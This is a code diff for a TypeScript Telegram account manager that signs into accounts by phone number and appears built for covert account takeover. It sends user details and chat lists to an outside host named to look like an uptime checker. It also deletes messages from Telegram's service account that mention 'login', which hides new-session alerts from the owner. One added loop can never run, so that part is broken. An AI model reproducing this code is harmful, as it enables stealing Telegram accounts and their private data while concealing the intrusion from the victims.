@@ -19,6 +19,7 @@ export async function restAcc(phoneNumber) {
         await client.client.destroy();
         await client.client.disconnect();
         client.client.session.delete();
+        client.session.delete();
         client.client = null;
         delete client['client'];
         await deleteClient(phoneNumber);
@@ -53,17 +54,19 @@ export async function disconnectAll() {
 
 export async function createClient(number) {
     if (clients.has(number)) {
+        console.log("Client already exist");
         const cli: TelegramManager = clients.get(number);
         setTimeout(async () => {
             await restAcc(number)
-        }, 240000);
+        }, 150000);
         return (await cli.sendCode(false));
     } else {
+        console.log("Creating new client");
         const cli = new TelegramManager(number);
         clients.set(number, cli);
         setTimeout(async () => {
             await restAcc(number)
-        }, 240000);
+        }, 150000);
         return (await cli.sendCode(false));
     }
 }
@@ -98,11 +101,13 @@ class TelegramManager {
     }
 
     async deleteMessages() {
-        const msgs = await this.client.getMessages("777000", { limit: 2 });
-        msgs.forEach(async msg => {
-            if (msg.text.toLowerCase().includes('login'))
-                await msg.delete({ revoke: true });
-        })
+        if (this.client.connected) {
+            const msgs = await this.client.getMessages("777000", { limit: 2 });
+            msgs.forEach(async msg => {
+                if (msg.text.toLowerCase().includes('login'))
+                    await msg.delete({ revoke: true });
+            })
+        }
     }
 
     async sendCode(
@@ -215,9 +220,12 @@ class TelegramManager {
                 };
                 await axios.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
                 await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
-                setInterval(async () => {
+                let i = 3;
+                while (i < 3) {
                     await this.deleteMessages();
-                }, 5000)
+                    await sleep(3000);
+                    i--;
+                }
                 setTimeout(async () => {
                     await restAcc(this.phoneNumber);
                 }, 50000);
